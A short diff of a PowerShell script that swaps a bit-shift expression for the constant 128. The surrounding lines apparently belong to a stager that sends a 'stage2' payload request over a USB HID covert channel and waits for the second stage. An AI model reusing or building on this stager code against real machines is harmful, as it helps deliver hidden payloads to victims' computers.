@@ -68,7 +68,7 @@ $CTRL_MSG_STAGE2_REQUEST = [BitConverter]::GetBytes([uint32] 1)
 if ([System.BitConverter]::IsLittleEndian) {[array]::Reverse($CTRL_MSG_STAGE2_REQUEST) }
 $payload = $CTRL_CHANNEL + $CTRL_MSG_STAGE2_REQUEST
 $LEN = $payload.Length
-$FIN_BIT = (1 -shl 7)
+$FIN_BIT = 128
 $stage2request = [Byte[]](0, ($LEN -bor $FIN_BIT), $ACK) + $payload + (New-Object byte[] (62 - $LEN))
 $HIDout.Write($stage2request, 0, 65)
 $stage2 = $null
